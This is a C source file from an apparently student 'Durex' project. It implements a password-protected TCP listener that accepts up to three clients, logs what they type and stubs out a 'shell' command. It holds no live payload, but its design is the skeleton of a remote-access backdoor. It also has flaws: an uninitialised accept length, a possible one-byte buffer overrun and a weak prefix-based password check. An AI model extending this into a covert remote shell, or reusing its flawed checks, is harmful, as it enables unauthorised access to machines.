/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:44:24 by banthony          #+#    #+#             */
/*   Updated: 2019/11/13 17:50:03 by abara            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "server.h"
#include "durex_log.h"

/*
**	Build client prefix string: 'Client[x.x.x.x]:'
*/
static t_bool	client_prefix(void *data, char (*prefix)[PREFIX_SIZE])
{
	t_client *client;

	if (!(client = (t_client*)data) || !prefix)
		return (false);
	if (7 + 2 +  ft_strlen(client->addr) >= PREFIX_SIZE)
		return (false);
	ft_strncpy(&(*prefix)[0], "Client[", 7);
	ft_strncat(&(*prefix)[0], client->addr, ft_strlen(client->addr));
	ft_strncat(&(*prefix)[0], "]:", 2);
	return (true);
}

static void		send_text(char *text, int socket)
{
	if (socket > 0 && text)
		send(socket, text, ft_strlen(text), 0);
}

static void		welcome_client(t_client *clt)
{
	char *mess;

	mess =	"/* ************************************************************************** */\n"
			"/*                                                        :::      ::::::::   */\n"
			"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
										"                           :+:      :+:    :+:   */\n"
			"/*                                                    +:+ +:+         +:+     */\n"
			"/*      * 3 clients max                             +#+  +:+       +#+        */\n"
			"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"
			"/*                                                     #+#    #+#             */\n"
			"/*                                                    ###   ########          */\n"
			"/* ************************************************************************** */\n"
		"\nDurex>";
	send_text(mess, clt->socket);
	clt->granted = true;
	durex_log_with(CLIENT_LOG, LOG_INFO, client_prefix, clt);
}

static t_bool	add_client(t_server *server, int cs, struct sockaddr_in csin)
{
	t_list		*nc;
	t_client	new_client;

	new_client.socket = cs;
	new_client.addr = inet_ntoa(csin.sin_addr);
	new_client.granted = false;
	if (!(nc = ft_lstnew(&new_client, sizeof(new_client))))
	{
		durex_log(ALLOC_ERR("Connexion aborted.\n"), LOG_WARNING);
		send_text(ALLOC_ERR("Connexion aborted.\n"), cs);
		FD_CLR(cs, &server->masterfdset);
		close(cs);
		return (false);
	}

	if (server->client_lst == NULL)
		server->client_lst = nc;
	else
		ft_lstadd(&server->client_lst, nc);

	send_text(PASS_REQUEST, cs);
	FD_SET(cs, &server->masterfdset);
	server->clients++;
	durex_log_with(CLIENT_LOGIN, LOG_INFO, client_prefix, &new_client);
	return (true);
}

static t_bool	new_client(t_server *server)
{
	int					cs;
	unsigned int		cs_len;
	struct sockaddr_in	csin;

	if ((cs = accept(server->srv_sock, (struct sockaddr*)&csin, &cs_len)) < 0)
	{
		durex_log(ACCEPT_ERR, LOG_ERROR);
		return (false);
	}
	if (server->clients >= MAX_CLIENT)
	{
		durex_log(CONNEXION_REFUSED, LOG_INFO);
		send_text(CONNEXION_REFUSED, cs);
		FD_CLR(cs, &server->masterfdset);
		close(cs);
		return (false);
	}
	return (add_client(server, cs, csin));
}

t_bool	create_server(t_server *server, int port)
{
	int					sock;
	struct sockaddr_in	sin;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	if ((bind(sock, (const struct sockaddr*)&sin, sizeof(sin))) < 0)
	{
		// Log error
		return (false);
	}
	listen(sock, MAX_PENDING_CLIENT);
	memset(server, 0, sizeof(t_server));
	server->port = port;
	server->srv_sock = sock;
	return (true);
}

static void		del_client(void *data, size_t size)
{
	if (!data)
		return ;
	(void)size;
}
static t_bool	client_handler(t_server *server, int fd)
{
	t_list		*elmt;
	t_list		*prev;
	t_client	*client;
	char		buf[READ_BUFFER_SIZE];
	ssize_t		ret;

	prev = NULL;
	elmt = server->client_lst;
	while (elmt)
	{
		client = (t_client*)elmt->content;
		if (fd == client->socket)
		{
			// use rcv instead
			if ((ret = recv(fd, buf, READ_BUFFER_SIZE, 0)) <= 0)
			{
				FD_CLR(fd, &server->masterfdset);
				close(fd);
				durex_log_with(DISCONNECTED, LOG_INFO, client_prefix, client);
				server->clients--;
				// If we are not on the first elmt, relink the list
				if (prev)
					prev->next = elmt->next;
				// Update the first elmt if it's the first elmt
				else
					server->client_lst = elmt->next;
				// Finally delete this elmt
				ft_lstdelone(&elmt, del_client);
				return (true);
			}
			if (client->granted == false)
			{
				(!ft_strncmp(buf, PASSWORD, (size_t)ret)) ? welcome_client(client)
					: send_text(PASS_REQUEST, fd);
				elmt->content = client;
				break ;
			}
			buf[ret] = '\0';
			if (!ft_strncmp(buf, "help\n", ret))
				send_text(HELP, fd);
			else if (!ft_strncmp(buf, "shell\n", ret))
				send_text("not implemented yet.", fd);
			durex_log_with(buf, LOG_INFO, client_prefix, client);
			send_text(SERVER_PROMPT, fd);
			break ;
		}
		prev = elmt;
		elmt = elmt->next;
	}
	return (true);
}

t_bool	server_loop(t_server *server)
{
	int		i;
	fd_set	readfdset;

	FD_ZERO(&readfdset);
	FD_ZERO(&server->masterfdset);
	FD_SET(server->srv_sock, &server->masterfdset);
	durex_log(SERVER_STARTED, LOG_INFO);
	while (42)
	{
		readfdset = server->masterfdset;
		if (select(FD_SETSIZE, &readfdset, NULL, NULL, NULL) < 0)
		{
			durex_log(SELECT_ERR, LOG_ERROR);
			return (false);
		}
		i = -1;
		while (++i < FD_SETSIZE)
		{
			// Does this descriptor is ready for read ?
			if (FD_ISSET(i, &readfdset) == 0)
				continue;
				// If it correspond to the server descriptor, handle a new connexion
			if (FD_ISSET(server->srv_sock, &readfdset))
				new_client(server);
			// Otherwise, handle client data
			else
				client_handler(server, i);
		}
	}
}
